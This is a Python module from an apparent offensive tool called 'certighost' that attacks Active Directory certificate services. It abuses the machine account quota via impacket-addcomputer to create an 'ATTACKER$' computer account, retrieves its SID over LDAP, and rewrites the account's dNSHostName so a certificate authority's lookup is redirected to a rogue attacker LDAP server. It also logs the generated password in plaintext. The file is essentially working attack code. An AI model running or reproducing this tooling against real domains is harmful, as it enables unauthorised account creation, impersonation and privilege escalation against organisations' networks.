"""
Machine account module -- create machine account via ms-DS-MachineAccountQuota.

Uses impacket-addcomputer (subprocess) to create the computer object,
then ldap3 to fetch the actual SID.
"""

import logging
import random
import string
import subprocess
from typing import Any

from ldap3 import Server, Connection, NTLM, SUBTREE, MODIFY_REPLACE
from ldap3.utils.conv import escape_filter_chars

logger = logging.getLogger("certighost.machine_account")


def _generate_random_password(length: int = 24) -> str:
    """Generate a random password."""
    chars = string.ascii_letters + string.digits + "!@#"
    return "".join(random.choice(chars) for _ in range(length))


def _run_addcomputer(
    domain: str,
    username: str,
    password: str,
    dc_ip: str,
    machine_name: str,
    machine_password: str,
    no_add: bool = False,
) -> str:
    """Create machine account via impacket-addcomputer (subprocess)."""
    cmd = [
        "impacket-addcomputer",
        f"{domain}/{username}:{password}",
        "-method", "SAMR",
        "-computer-name", machine_name.rstrip("$"),
        "-computer-pass", machine_password,
        "-dc-ip", dc_ip,
    ]
    if no_add:
        cmd.append("-no-add")
    result = subprocess.run(cmd, capture_output=True, text=True, timeout=30)
    if result.returncode != 0:
        raise RuntimeError(f"addcomputer failed: {result.stderr}")
    return result.stdout


def _sid_bytes_to_str(sid_bytes: bytes) -> str:
    """Convert binary objectSid to string (e.g. S-1-5-21-...)."""
    revision = sid_bytes[0]
    sub_authority_count = sid_bytes[1]
    authority = int.from_bytes(sid_bytes[2:8], byteorder="big")
    sub_authorities = []
    for i in range(sub_authority_count):
        offset = 8 + i * 4
        sub_auth = int.from_bytes(sid_bytes[offset:offset + 4], byteorder="little")
        sub_authorities.append(str(sub_auth))
    return f"S-{revision}-{authority}-" + "-".join(sub_authorities)


def _fetch_machine_sid(
    domain: str,
    username: str,
    password: str,
    dc_ip: str,
    machine_name: str,
) -> str:
    """Fetch the actual SID of the machine account from AD via LDAP."""
    server = Server(dc_ip, get_info=None)
    conn = Connection(
        server,
        user=f"{domain}\\{username}",
        password=password,
        authentication=NTLM,
        auto_bind=True,
    )

    # Base DN z domain name
    base = ",".join(f"DC={part}" for part in domain.split("."))

    # sAMAccountName always ends with $
    sam_name = machine_name if machine_name.endswith("$") else machine_name + "$"

    conn.search(
        base,
        f"(sAMAccountName={escape_filter_chars(sam_name)})",
        search_scope=SUBTREE,
        attributes=["objectSid"],
    )

    if not conn.entries:
        conn.unbind()
        raise RuntimeError(
            f"Machine account '{sam_name}' not found in LDAP after creation"
        )

    sid_value = conn.entries[0]["objectSid"].value
    conn.unbind()

    if isinstance(sid_value, bytes):
        return _sid_bytes_to_str(sid_value)
    return str(sid_value)


async def create_machine_account(
    domain: str,
    username: str,
    password: str,
    dc_ip: str,
    machine_name: str = "ATTACKER$",
    ou: str = "CN=Computers",
    machine_password: str = None,
) -> dict[str, Any]:
    """
    Create a machine account in AD via impacket-addcomputer.

    Leverages ms-DS-MachineAccountQuota (default: 10 accounts per domain user).

    Returns:
        dict with keys: dn, sid, password, spns, existing
    """
    logger.info(f"Creating machine account '{machine_name}' in {ou}...")

    if machine_password is None:
        machine_password = _generate_random_password()

    # ========================================
    # Create machine account via impacket-addcomputer
    # ========================================
    already_exists = False
    try:
        output = _run_addcomputer(
            domain, username, password, dc_ip, machine_name, machine_password
        )
        logger.debug(f"addcomputer output: {output}")
        if "already exists" in output.lower():
            already_exists = True
            logger.info(f"Machine account '{machine_name}' already exists, resetting password...")
            output = _run_addcomputer(
                domain, username, password, dc_ip, machine_name, machine_password,
                no_add=True,
            )
            logger.debug(f"addcomputer -no-add output: {output}")
    except RuntimeError as e:
        err_msg = str(e).lower()
        if "already exists" in err_msg:
            already_exists = True
            logger.info(f"Machine account '{machine_name}' already exists, resetting password...")
            output = _run_addcomputer(
                domain, username, password, dc_ip, machine_name, machine_password,
                no_add=True,
            )
            logger.debug(f"addcomputer -no-add output: {output}")
        else:
            raise

    # ========================================
    # Fetch actual SID from LDAP
    # ========================================
    sid = _fetch_machine_sid(domain, username, password, dc_ip, machine_name)
    logger.debug(f"Fetched SID from LDAP: {sid}")

    # ========================================
    # Build SPNs and DN
    # ========================================
    clean_name = machine_name.rstrip("$").lower()
    spns = [
        f"HOST/{clean_name}.{domain}",
        f"RestrictedKrbHost/{clean_name}.{domain}",
        f"HOST/{clean_name}",
        f"RestrictedKrbHost/{clean_name}",
    ]

    base_dn = ",".join(f"DC={part}" for part in domain.split("."))
    dn = f"CN={machine_name.rstrip('$')},{ou},{base_dn}"

    result = {
        "dn": dn,
        "sid": sid,
        "password": machine_password,
        "spns": spns,
        "existing": already_exists,
    }

    logger.info(
        f"Machine account '{machine_name}' "
        f"{'found' if already_exists else 'created'} successfully"
    )
    logger.info(f"  DN:       {result['dn']}")
    logger.info(f"  SID:      {result['sid']}")
    logger.info(f"  SPNs:     {', '.join(result['spns'])}")
    logger.info(f"  Password: {result['password']}")

    return result


async def configure_chase_redirect(
    domain: str,
    username: str,
    password: str,
    dc_ip: str,
    machine_name: str,
    attacker_hostname: str,
) -> bool:
    """
    Configure machine account for chase mechanism redirect.

    Sets dNSHostName on the machine account to the attacker's hostname
    so that the CA's chase LDAP lookup resolves to the rogue LDAP server.

    The machine account creator has validated-write on dNSHostName.

    Args:
        domain: AD domain name
        username: Domain user (machine account creator)
        password: User password
        dc_ip: Domain Controller IP
        machine_name: Machine account name (with or without $)
        attacker_hostname: Attacker's FQDN that resolves to rogue LDAP IP

    Returns:
        True if modification succeeded
    """
    logger.info(f"Configuring chase redirect on '{machine_name}' -> {attacker_hostname}")

    server = Server(dc_ip, get_info=None)
    conn = Connection(
        server,
        user=f"{domain}\\{username}",
        password=password,
        authentication=NTLM,
        auto_bind=True,
    )

    base = ",".join(f"DC={part}" for part in domain.split("."))
    sam_name = machine_name if machine_name.endswith("$") else machine_name + "$"

    conn.search(
        base,
        f"(sAMAccountName={escape_filter_chars(sam_name)})",
        search_scope=SUBTREE,
        attributes=["distinguishedName", "dNSHostName"],
    )

    if not conn.entries:
        conn.unbind()
        raise RuntimeError(
            f"Machine account '{sam_name}' not found — cannot configure redirect"
        )

    machine_dn = str(conn.entries[0].distinguishedName.value)
    old_dns = str(conn.entries[0].dNSHostName.value) if conn.entries[0].dNSHostName else None
    logger.debug(f"Machine DN: {machine_dn}, current dNSHostName: {old_dns}")

    success = conn.modify(
        machine_dn,
        {"dNSHostName": [(MODIFY_REPLACE, [attacker_hostname])]},
    )

    if not success:
        result = conn.result
        logger.warning(
            f"dNSHostName modify failed: {result.get('description', '')} "
            f"({result.get('message', '')})"
        )
        logger.info("Chase redirect may still work via CDC attribute in CSR")
        conn.unbind()
        return False

    conn.unbind()
    logger.info(f"dNSHostName set to {attacker_hostname} on {machine_dn}")
    return True


